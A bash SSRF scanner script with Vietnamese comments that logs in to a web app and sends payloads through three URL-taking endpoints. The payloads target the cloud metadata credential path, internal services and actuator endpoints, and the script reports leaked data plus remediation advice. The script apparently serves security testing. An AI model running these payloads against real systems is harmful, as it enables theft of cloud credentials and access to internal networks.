#!/bin/bash

# =============================================================================
# GRAYBOX SSRF SCANNER
# =============================================================================
# Tool tự động scan SSRF vulnerabilities dựa trên Swagger API documentation
#
# BẠN CUNG CẤP:
#   - Username/Password
#   - Base URL
#
# TOOL TRẢ VỀ:
#   - Danh sách vulnerabilities
#   - Leaked data preview
#   - JSON report file
# =============================================================================

set -e

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# ===========================
# 1. BẠN CUNG CẤP INPUT
# ===========================
USERNAME="${USERNAME:-graybox_test}"
PASSWORD="${PASSWORD:-Test@123}"
BASE_URL="${BASE_URL:-https://quangtx.io.vn}"

echo -e "${CYAN}=========================================${NC}"
echo -e "${CYAN}     GRAYBOX SSRF VULNERABILITY SCANNER${NC}"
echo -e "${CYAN}=========================================${NC}"
echo ""
echo -e "${YELLOW}[Config]${NC}"
echo "  Base URL: $BASE_URL"
echo "  Username: $USERNAME"
echo ""

# ===========================
# 2. TOOL TỰ ĐỘNG LẤY TOKEN
# ===========================
echo -e "${YELLOW}[*] Step 1: Authenticating...${NC}"

# Register user (ignore if exists)
curl -s -X POST "$BASE_URL/api/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\",\"email\":\"test@example.com\"}" \
  > /dev/null 2>&1 || true

# Login and get token
TOKEN=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}" \
  | jq -r '.token')

if [ -z "$TOKEN" ] || [ "$TOKEN" == "null" ]; then
  echo -e "${RED}❌ Authentication failed!${NC}"
  exit 1
fi

echo -e "${GREEN}✅ Token obtained: ${TOKEN:0:20}...${NC}"
echo ""

# ===========================
# 3. TOOL TẠO SSRF PAYLOADS
# ===========================
echo -e "${YELLOW}[*] Step 2: Preparing SSRF payloads...${NC}"

PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://user-service:8081/api/users"
  "http://inventory-service:5000/inventory/1"
  "http://localhost:8082/actuator/health"
  "http://localhost:8082/actuator/env"
  "http://localhost:8082/actuator/metrics"
  "http://127.0.0.1:8082/admin"
)

echo -e "${GREEN}✅ Loaded ${#PAYLOADS[@]} SSRF payloads${NC}"
echo ""

# ===========================
# 4. TOOL TỰ ĐỘNG TEST
# ===========================
RESULTS=()
TOTAL_REQUESTS=0

# Test check_price endpoint
echo -e "${YELLOW}[*] Step 3: Testing /api/products/{id}/check-price/ endpoint...${NC}"

for payload in "${PAYLOADS[@]}"; do
  echo -e "  ${CYAN}[+] Testing:${NC} $payload"
  
  # URL encode payload
  ENCODED=$(printf "%s" "$payload" | jq -sRr @uri)
  
  # Send request
  RESPONSE=$(curl -s -X GET \
    "$BASE_URL/api/products/1/check-price/?compare_url=$ENCODED" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Accept: application/json" \
    --connect-timeout 10 \
    --max-time 15)
  
  TOTAL_REQUESTS=$((TOTAL_REQUESTS + 1))
  
  # Check if vulnerable
  if echo "$RESPONSE" | jq -e '.compared_price' > /dev/null 2>&1; then
    LEAKED=$(echo "$RESPONSE" | jq -r '.compared_price // empty' | head -c 200)
    
    if [ ! -z "$LEAKED" ] && [ "$LEAKED" != "null" ]; then
      echo -e "      ${RED}🚨 VULNERABLE!${NC} Leaked data:"
      echo -e "      ${LEAKED:0:100}..."
      
      RESULTS+=("VULNERABLE|check_price|compare_url|$payload|$LEAKED")
    else
      echo -e "      ${GREEN}✓ Not vulnerable (empty response)${NC}"
    fi
  else
    echo -e "      ${GREEN}✓ Not vulnerable or blocked${NC}"
  fi
  
  sleep 0.3  # Rate limiting
done

echo ""

# Test fetch_review endpoint
echo -e "${YELLOW}[*] Step 4: Testing /api/products/{id}/fetch-review/ endpoint...${NC}"

for payload in "${PAYLOADS[@]}"; do
  echo -e "  ${CYAN}[+] Testing:${NC} $payload"
  
  ENCODED=$(printf "%s" "$payload" | jq -sRr @uri)
  
  RESPONSE=$(curl -s -X GET \
    "$BASE_URL/api/products/1/fetch-review/?review_url=$ENCODED" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Accept: application/json" \
    --connect-timeout 10 \
    --max-time 15)
  
  TOTAL_REQUESTS=$((TOTAL_REQUESTS + 1))
  
  if echo "$RESPONSE" | jq -e '.review' > /dev/null 2>&1; then
    LEAKED=$(echo "$RESPONSE" | jq -r '.review // empty' | head -c 200)
    
    if [ ! -z "$LEAKED" ] && [ "$LEAKED" != "null" ]; then
      echo -e "      ${RED}🚨 VULNERABLE!${NC} Leaked data:"
      echo -e "      ${LEAKED:0:100}..."
      
      RESULTS+=("VULNERABLE|fetch_review|review_url|$payload|$LEAKED")
    else
      echo -e "      ${GREEN}✓ Not vulnerable (empty response)${NC}"
    fi
  else
    echo -e "      ${GREEN}✓ Not vulnerable or blocked${NC}"
  fi
  
  sleep 0.3
done

echo ""

# Test share endpoint (POST)
echo -e "${YELLOW}[*] Step 5: Testing /api/products/{id}/share/ endpoint (POST)...${NC}"

# Only test internal service targets for POST
POST_PAYLOADS=(
  "http://user-service:8081/api/webhook"
  "http://inventory-service:5000/webhook"
  "http://localhost:8082/admin/webhook"
)

for payload in "${POST_PAYLOADS[@]}"; do
  echo -e "  ${CYAN}[+] Testing:${NC} $payload"
  
  RESPONSE=$(curl -s -X POST \
    "$BASE_URL/api/products/1/share/" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"share_api_url\":\"$payload\",\"message\":\"SSRF Test\"}" \
    --connect-timeout 10 \
    --max-time 15)
  
  TOTAL_REQUESTS=$((TOTAL_REQUESTS + 1))
  
  if echo "$RESPONSE" | jq -e '.share_result' > /dev/null 2>&1; then
    LEAKED=$(echo "$RESPONSE" | jq -r '.share_result // empty' | head -c 200)
    
    if [ ! -z "$LEAKED" ] && [ "$LEAKED" != "null" ]; then
      echo -e "      ${RED}🚨 VULNERABLE!${NC} Server made POST request to internal service"
      echo -e "      Response: ${LEAKED:0:100}..."
      
      RESULTS+=("VULNERABLE|share|share_api_url|$payload|$LEAKED")
    else
      echo -e "      ${GREEN}✓ Not vulnerable${NC}"
    fi
  else
    echo -e "      ${GREEN}✓ Not vulnerable or blocked${NC}"
  fi
  
  sleep 0.3
done

echo ""

# ===========================
# 5. TOOL TRẢ VỀ REPORT
# ===========================
echo -e "${CYAN}=========================================${NC}"
echo -e "${CYAN}          SSRF SCAN REPORT${NC}"
echo -e "${CYAN}=========================================${NC}"
echo ""
echo "Scan Date: $(date '+%Y-%m-%d %H:%M:%S')"
echo "Base URL: $BASE_URL"
echo "Total Requests: $TOTAL_REQUESTS"
echo "Total Payloads: $((${#PAYLOADS[@]} * 2 + ${#POST_PAYLOADS[@]}))"
echo "Vulnerable Findings: ${#RESULTS[@]}"
echo ""

if [ ${#RESULTS[@]} -gt 0 ]; then
  echo -e "${RED}🚨 VULNERABILITIES FOUND:${NC}"
  echo ""
  
  VULN_NUM=1
  for result in "${RESULTS[@]}"; do
    IFS='|' read -r status endpoint param payload leaked <<< "$result"
    
    echo -e "${RED}[$VULN_NUM] SSRF Vulnerability${NC}"
    echo "  Endpoint: /api/products/1/$endpoint/"
    echo "  Parameter: $param"
    echo "  Payload: $payload"
    echo "  Leaked Data Preview:"
    echo "    ${leaked:0:150}"
    if [ ${#leaked} -gt 150 ]; then
      echo "    ... (truncated)"
    fi
    echo ""
    
    VULN_NUM=$((VULN_NUM + 1))
  done
else
  echo -e "${GREEN}✅ No SSRF vulnerabilities found${NC}"
fi

# ===========================
# 6. TOOL XUẤT JSON REPORT
# ===========================
REPORT_FILE="ssrf-scan-results-$(date +%Y%m%d-%H%M%S).json"

cat > "$REPORT_FILE" << EOF
{
  "scan_date": "$(date -Iseconds 2>/dev/null || date '+%Y-%m-%dT%H:%M:%S')",
  "base_url": "$BASE_URL",
  "total_requests": $TOTAL_REQUESTS,
  "total_payloads": $((${#PAYLOADS[@]} * 2 + ${#POST_PAYLOADS[@]})),
  "vulnerable_findings": ${#RESULTS[@]},
  "vulnerabilities": [
EOF

FIRST=true
for result in "${RESULTS[@]}"; do
  IFS='|' read -r status endpoint param payload leaked <<< "$result"
  
  # Escape JSON special characters
  LEAKED_ESCAPED=$(echo "$leaked" | jq -Rs .)
  PAYLOAD_ESCAPED=$(echo "$payload" | jq -Rs .)
  
  if [ "$FIRST" = true ]; then
    FIRST=false
  else
    echo "," >> "$REPORT_FILE"
  fi
  
  cat >> "$REPORT_FILE" << ITEM
    {
      "endpoint": "/api/products/1/$endpoint/",
      "parameter": "$param",
      "payload": $PAYLOAD_ESCAPED,
      "leaked_data_preview": $LEAKED_ESCAPED,
      "severity": "CRITICAL",
      "impact": "Internal service access, metadata leak, potential RCE"
    }
ITEM
done

cat >> "$REPORT_FILE" << EOF

  ]
}
EOF

echo -e "${GREEN}📄 Full report saved to: $REPORT_FILE${NC}"
echo ""

# ===========================
# 7. TOOL RECOMMENDATIONS
# ===========================
if [ ${#RESULTS[@]} -gt 0 ]; then
  echo -e "${YELLOW}🔧 RECOMMENDATIONS:${NC}"
  echo ""
  echo "1. Input Validation:"
  echo "   - Whitelist allowed domains/IPs"
  echo "   - Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)"
  echo "   - Block localhost, 127.0.0.1, 169.254.169.254"
  echo ""
  echo "2. Network Segmentation:"
  echo "   - Use network policies to restrict service-to-service communication"
  echo "   - Deploy egress filtering"
  echo ""
  echo "3. Monitoring:"
  echo "   - Log all external HTTP requests"
  echo "   - Alert on requests to internal services"
  echo ""
  exit 1
else
  echo -e "${GREEN}✅ All tests passed! No SSRF vulnerabilities detected.${NC}"
  exit 0
fi
